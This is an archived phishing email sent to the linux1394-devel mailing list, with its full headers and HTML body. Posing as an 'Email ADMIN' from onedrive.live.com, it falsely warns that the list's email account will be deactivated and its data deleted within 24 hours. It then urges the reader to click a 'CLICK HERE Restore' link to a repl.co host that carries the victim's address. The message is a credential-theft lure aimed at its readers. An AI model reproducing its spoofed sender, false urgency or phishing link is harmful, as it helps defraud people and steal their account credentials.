Return-Path: <linux1394-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+linux1394-devel@lfdr.de
Delivered-To: lists+linux1394-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 690F83A1C02
	for <lists+linux1394-devel@lfdr.de>; Wed,  9 Jun 2021 19:42:10 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.90_1)
	(envelope-from <linux1394-devel-bounces@lists.sourceforge.net>)
	id 1lr2DD-0005xX-9M; Wed, 09 Jun 2021 17:41:55 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-4.v29.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.90_1)
 (envelope-from <noreply@onedrive.live.com>) id 1lr2DB-0005xQ-CD
 for linux1394-devel@lists.sourceforge.net; Wed, 09 Jun 2021 17:41:53 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Reply-To:Sender:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=j1LL1RuvTdRx+yxI+8PobXSgJno17XY5Jb1eEi5fMDo=; b=jyVm+cIiaZY2WtKL7gewD8O25H
 QprdznEQ/8nwJIcct1DPZZ+ti/hWeRqOsP9alGoBEn7IU4GErQd34uyYFamDQtkHGfg53ZL2eJU/c
 n/hUBj9f0jFUVDoLouzXzXQtLhw6gAGEXButaovMu+YYuUaRGTwfeTq76VtGWBaYpRAk=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Reply-To:Sender:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=j1LL1RuvTdRx+yxI+8PobXSgJno17XY5Jb1eEi5fMDo=; b=l
 g5QOjgr7tGfs8DKvAQZpD03lwQsdB4Zd35VnWQm74Ux8flJW1epg6RWBZhw2N4uBAfynuM1LU2e9F
 tlDHfziu9MiJXjIBVZf/Wg9yYw9AnaLc6rUnGzVp2iiQdWwP13/RORkaIg+cYya410BambaSkwSfw
 OQ0/5lHuS68KAZj8=;
Received: from [80.85.140.142] (helo=fruitwerkz.com)
 by sfi-mx-1.v28.lw.sourceforge.com with esmtp (Exim 4.92.3)
 id 1lr2D5-002Pvr-2D
 for linux1394-devel@lists.sourceforge.net; Wed, 09 Jun 2021 17:41:56 +0000
Received: from onedrive.live.com (localhost [127.0.0.1])
 by fruitwerkz.com (Postfix) with ESMTP id 42DE592FAA5
 for <linux1394-devel@lists.sourceforge.net>;
 Wed,  9 Jun 2021 17:41:40 +0000 (UTC)
From: Email ADMIN  <noreply@onedrive.live.com>
To: linux1394-devel@lists.sourceforge.net
Subject: Important:: Action required lists.sourceforge.net
Date: 09 Jun 2021 20:41:37 +0300
Message-ID: <20210609204136.7EB5600A1F39C79C@onedrive.live.com>
MIME-Version: 1.0
X-Spam-Score: 7.0 (+++++++)
X-Spam-Report: Spam Filtering performed by mx.sourceforge.net.
 See http://spamassassin.org/tag/ for more details.
 0.0 URIBL_BLOCKED ADMINISTRATOR NOTICE: The query to URIBL was blocked.
 See
 http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
 for more information. [URIs: repl.co]
 0.0 SPF_NONE               SPF: sender does not publish an SPF Record
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 1.0 HTML_MESSAGE           BODY: HTML included in message
 2.3 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 1.0 RDNS_NONE Delivered to internal network by a host with no rDNS
 1.5 HTML_FONT_TINY_NORDNS  Font too small to read, no rDNS
 1.2 TO_NO_BRKTS_NORDNS_HTML To: lacks brackets and no rDNS and HTML only
X-Headers-End: 1lr2D5-002Pvr-2D
X-BeenThere: linux1394-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: Linux IEEE 1394 development list
 <linux1394-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/linux1394-devel>, 
 <mailto:linux1394-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=linux1394-devel>
List-Post: <mailto:linux1394-devel@lists.sourceforge.net>
List-Help: <mailto:linux1394-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/linux1394-devel>, 
 <mailto:linux1394-devel-request@lists.sourceforge.net?subject=subscribe>
Reply-To: Email ADMIN <noreply@iionedrive.live.com>
Content-Type: multipart/mixed; boundary="===============0403045632203787885=="
Errors-To: linux1394-devel-bounces@lists.sourceforge.net

--===============0403045632203787885==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.19699"></HEAD>
<body>
<P style=3D'FONT-SIZE: 11px; FONT-FAMILY: "Lucida Grande", Verdana, Arial, =
Helvetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFO=
RM: none; FONT-WEIGHT: 400; COLOR: rgb(51,51,51); FONT-STYLE: normal; ORPHA=
NS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255=
); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: nor=
mal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-d=
ecoration-color: initial'><BR>&nbsp;</P>
<DIV style=3D'FONT-SIZE: 11px; FONT-FAMILY: "Lucida Grande", Verdana, Arial=
, Helvetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANS=
FORM: none; FONT-WEIGHT: 400; COLOR: rgb(51,51,51); FONT-STYLE: normal; ORP=
HANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,2=
55); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: n=
ormal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text=
-decoration-color: initial' dir=3Dltr>
<DIV style=3D"BORDER-TOP: 0px; PADDING-TOP: 0px" dir=3Dltr>
<DIV id=3Dm_-2366680748320383580m_8213883353781462944m_4862631521929489402m=
_723104160854409008m_-4235383262629915302m_-8265022980045132773gmail-mailTe=
xt style=3D"FONT-SIZE: 14px; BORDER-TOP: 0px; FONT-FAMILY: verdana, Tahoma,=
 Arial, &#23435;&#20307;, sans-serif; COLOR: rgb(51,51,51); PADDING-TOP: 0p=
x">
<DIV style=3D"BORDER-TOP: 0px; PADDING-TOP: 0px">
<DIV style=3D"BORDER-TOP: 0px; PADDING-TOP: 0px; MARGIN: 0.4em">
<DIV style=3D"BORDER-TOP: 0px; PADDING-TOP: 0px" dir=3Dltr>
<table style=3D"FONT-SIZE: 11px; FONT-FAMILY: &quot;Lucida Grande&quot;, Ve=
rdana, Arial, Helvetica, sans-serif; BORDER-COLLAPSE: collapse" cellspacing=
=3D"0" cellpadding=3D"0" width=3D"100%" border=3D"0">
<TBODY>
<TR>
<td style=3D"FONT-SIZE: 38px; FONT-FAMILY: &quot;Segoe UI Semibold&quot;, S=
UWSB, &quot;Segoe UI&quot;, Verdana, sans-serif; BORDER-COLLAPSE: collapse;=
 COLOR: rgb(80,80,80); PADDING-BOTTOM: 0px; TEXT-ALIGN: center; PADDING-TOP=
: 60px; PADDING-LEFT: 50px; LETTER-SPACING: -0.03em; LINE-HEIGHT: 48px; PAD=
DING-RIGHT: 50px" bgcolor=3D"#f4f4f4" align=3D"center">
<H2 style=3D"FONT-SIZE: 30px; FONT-WEIGHT: normal; PADDING-BOTTOM: 0px; PAD=
DING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; LETTER-SPACING: -0.03em; LIN=
E-HEIGHT: 48px; PADDING-RIGHT: 0px"><A onclick=3D"return false" style=3D"CO=
LOR: rgb(1,134,186)" href=3D"http://webmail.lists.sourceforge.net/#NOP" rel=
=3Dnoreferrer>lists.sourceforge.net</A></H2></TD></TR>
<TR>
<td style=3D"FONT-SIZE: 13px; FONT-FAMILY: &quot;Segoe UI&quot;, SUWR, Verd=
ana, sans-serif; BORDER-COLLAPSE: collapse; COLOR: rgb(80,80,80); PADDING-B=
OTTOM: 0px; PADDING-TOP: 25px; PADDING-LEFT: 50px; LETTER-SPACING: -0.01em;=
 LINE-HEIGHT: 20px; PADDING-RIGHT: 50px" bgcolor=3D"#f4f4f4" align=3D"cente=
r">
<table style=3D"MIN-WIDTH: 300px" cellspacing=3D"0" cellpadding=3D"0" borde=
r=3D"0">
<TBODY>
<TR>
<td style=3D"FONT-FAMILY: Roboto-Regular, Helvetica, Arial, sans-serif; PAD=
DING-BOTTOM: 4px; PADDING-TOP: 4px; PADDING-LEFT: 0px; LINE-HEIGHT: 1.5; PA=
DDING-RIGHT: 0px">
<P style=3D"COLOR: rgb(32,32,32)" align=3Dcenter><SPAN style=3D"FONT-SIZE: =
xx-small"><SPAN style=3D"FONT-FAMILY: Roboto-Regular, Helvetica, Arial, san=
s-serif, serif, EmojiFont; LETTER-SPACING: normal"><SPAN style=3D"FONT-SIZE=
: small">We&nbsp;just received&nbsp; request&nbsp;to deactivate&nbsp;your e=
mail&nbsp;account listed below.</SPAN></SPAN></SPAN></P>
<P align=3Dcenter><FONT color=3D#202020><SPAN style=3D"FONT-SIZE: small"></=
SPAN></FONT><SPAN style=3D"FONT-FAMILY: Roboto-Regular, Helvetica, Arial, s=
ans-serif, serif, EmojiFont; COLOR: rgb(32,32,32); LETTER-SPACING: normal">=
<SPAN style=3D"FONT-SIZE: small"></SPAN><SPAN style=3D"FONT-SIZE: small">Yo=
ur email is:&nbsp;</SPAN></SPAN><FONT color=3D#202020>&nbsp;</FONT><FONT co=
lor=3D#0000ff>
 <A onclick=3D"return rcmail.command('compose','linux1394-devel@lists.sourc=
eforge.net',this)" style=3D"COLOR: rgb(1,134,186)" href=3D"mailto:linux1394=
-devel@lists.sourceforge.net" rel=3Dnoreferrer>linux1394-devel@lists.source=
forge.net</A></FONT><SPAN style=3D"FONT-FAMILY: Roboto-Regular, Helvetica, =
Arial, sans-serif, serif, EmojiFont; COLOR: rgb(32,32,32); LETTER-SPACING: =
normal"><SPAN style=3D"FONT-SIZE: small"><STRONG><BR><BR></STRONG>
Within 24 hours, all&nbsp;email data&nbsp;associated with your account will=
 be deleted from our servers and your account will&nbsp;be permanently&nbsp=
;deactivated.<BR></SPAN></SPAN></P></TD></TR>
<TR>
<td style=3D"FONT-FAMILY: Roboto-Regular, Helvetica, Arial, sans-serif; COL=
OR: rgb(32,32,32); PADDING-BOTTOM: 4px; LINE-HEIGHT: 1.5">&nbsp;</TD></TR>
<TR>
<td style=3D"BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0px; PADDING-TOP: 3=
5px; PADDING-LEFT: 50px; PADDING-RIGHT: 50px" bgcolor=3D"#f4f4f4" align=3D"=
center">
<table style=3D"BORDER-COLLAPSE: collapse; MARGIN: 0px auto" cellspacing=3D=
"0" cellpadding=3D"0" align=3D"center" border=3D"0">
<TBODY>
<TR>
<td style=3D"BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0px; PADDING-TOP: 0=
px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px">
<table style=3D"BORDER-COLLAPSE: collapse" cellspacing=3D"0" cellpadding=3D=
"0" border=3D"0">
<TBODY>
<TR>
<td style=3D"BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0px; PADDING-TOP: 0=
px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px; border-radius: 0px" bgcolor=3D"#=
d23b01">
<table style=3D"BORDER-COLLAPSE: collapse" cellspacing=3D"0" cellpadding=3D=
"0" border=3D"0">
<TBODY>
<TR>
<td style=3D"FONT-SIZE: 2px; BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0px=
; PADDING-TOP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 2; PADDING-RIGHT: 0px; =
border-radius: 4px" height=3D"2">&nbsp;</TD></TR>
<TR>
<td style=3D"BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0px; PADDING-TOP: 0=
px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px">
<table style=3D"BORDER-COLLAPSE: collapse" cellspacing=3D"0" cellpadding=3D=
"0" border=3D"0">
<TBODY>
<TR>
<td style=3D"BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0px; PADDING-TOP: 0=
px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px" width=3D"2">&nbsp;</TD>
<td style=3D"BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0px; PADDING-TOP: 0=
px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px">
<table style=3D"BORDER-COLLAPSE: collapse; MARGIN: 0px auto" cellspacing=3D=
"0" cellpadding=3D"0" align=3D"center" border=3D"0">
<TBODY>
<TR>
<td style=3D"FONT-SIZE: 16px; FONT-FAMILY: &quot;Segoe UI Semibold&quot;, S=
UWSB, &quot;Segoe UI&quot;, Verdana, sans-serif; BORDER-COLLAPSE: collapse;=
 PADDING-BOTTOM: 11px; TEXT-ALIGN: center; PADDING-TOP: 11px; PADDING-LEFT:=
 46px; LETTER-SPACING: -0.01em; LINE-HEIGHT: 21px; PADDING-RIGHT: 46px" ali=
gn=3D"center">
<A id=3Dm_-2366680748320383580m_8213883353781462944m_4862631521929489402m_7=
23104160854409008m_-4235383262629915302m_-8265022980045132773gmail-m_-81517=
27502435008386m_6071888078740827102m_-6305057664783212805gmail-m_-871358632=
7481304440gmail-LPlnk768108 style=3D"WIDTH: 145px; COLOR: rgb(255,255,255);=
 DISPLAY: inline-block; BACKGROUND-COLOR: transparent" href=3D"https://00si=
teGraveDraftyLaw.goliknonig.repl.co/?email=3Dlinux1394-devel@lists.sourcefo=
rge.net" rel=3Dnoreferrer target=3D_blank>CLICK HERE Restore</A></TD></TR><=
/TBODY>
</TABLE></TD>
<td style=3D"BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0px; PADDING-TOP: 0=
px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px" width=3D"2">&nbsp;</TD></TR></TB=
ODY></TABLE></TD></TR>
<TR>
<td style=3D"FONT-SIZE: 2px; BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0px=
; PADDING-TOP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 2; PADDING-RIGHT: 0px; =
border-radius: 0px" height=3D"2">&nbsp;</TD></TR></TBODY></TABLE></TD></TR>=
</TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR>
<TR>
<td style=3D"BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0px; PADDING-TOP: 3=
5px; PADDING-LEFT: 50px; PADDING-RIGHT: 50px" bgcolor=3D"#f4f4f4" align=3D"=
center">
<table style=3D"BORDER-COLLAPSE: collapse; MARGIN: 0px auto" cellspacing=3D=
"0" cellpadding=3D"0" align=3D"center" border=3D"0">
<TBODY>
<TR>
<td style=3D"FONT-SIZE: 16px; FONT-FAMILY: &quot;Segoe UI Semibold&quot;, S=
UWSB, &quot;Segoe UI&quot;, Verdana, sans-serif; BORDER-COLLAPSE: collapse;=
 PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; LETTER-SPACING: =
-0.01em; LINE-HEIGHT: 21px; PADDING-RIGHT: 0px" bgcolor=3D"#f4f4f4" align=
=3D"left">&nbsp;</TD>
<td style=3D"BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 0px; PADDING-TOP: 0=
px; PADDING-LEFT: 10px; PADDING-RIGHT: 10px" bgcolor=3D"#f4f4f4" align=3D"l=
eft">
<table style=3D"MIN-WIDTH: 300px" cellspacing=3D"0" cellpadding=3D"0" borde=
r=3D"0">
<TBODY>
<TR>
<td style=3D"FONT-FAMILY: Roboto-Regular, Helvetica, Arial, sans-serif; COL=
OR: rgb(32,32,32); PADDING-BOTTOM: 4px; PADDING-TOP: 4px; PADDING-LEFT: 0px=
; LINE-HEIGHT: 1.5; PADDING-RIGHT: 0px">
<P align=3Dcenter><SPAN style=3D"FONT-SIZE: xx-small"><SPAN style=3D"FONT-S=
IZE: small"><BR><BR>Thank you for helping us keep your account safe.</SPAN>=
<BR></SPAN></P></TD></TR>
<TR>
<td style=3D"FONT-FAMILY: Roboto-Regular, Helvetica, Arial, sans-serif; COL=
OR: rgb(32,32,32); PADDING-TOP: 28px; LINE-HEIGHT: 1">
<P align=3Dcenter><BR><A onclick=3D"return false" style=3D"COLOR: rgb(1,134=
,186)" href=3D"http://webmail.lists.sourceforge.net/#NOP" rel=3Dnoreferrer>=
lists.sourceforge.net</A><SPAN style=3D"FONT-SIZE: xx-small"><SPAN style=3D=
"FONT-SIZE: small">&nbsp;Service Security</SPAN></SPAN><SPAN style=3D"FONT-=
SIZE: xx-small"><STRONG><BR><BR></STRONG><SPAN style=3D"FONT-SIZE: small">&=
copy; 2021 All Rights Reserved.</SPAN></SPAN></P></TD></TR></TBODY></TABLE>=
</TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TAB=
LE></DIV>
</DIV></DIV></DIV>
<P style=3D'FONT-SIZE: 11px; FONT-FAMILY: "Lucida Grande", Verdana, Arial, =
Helvetica, sans-serif; COLOR: rgb(51,51,51)'><BR>&nbsp;</P></DIV></DIV></BO=
DY></HTML>


--===============0403045632203787885==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============0403045632203787885==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
mailing list linux1394-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/linux1394-devel

--===============0403045632203787885==--
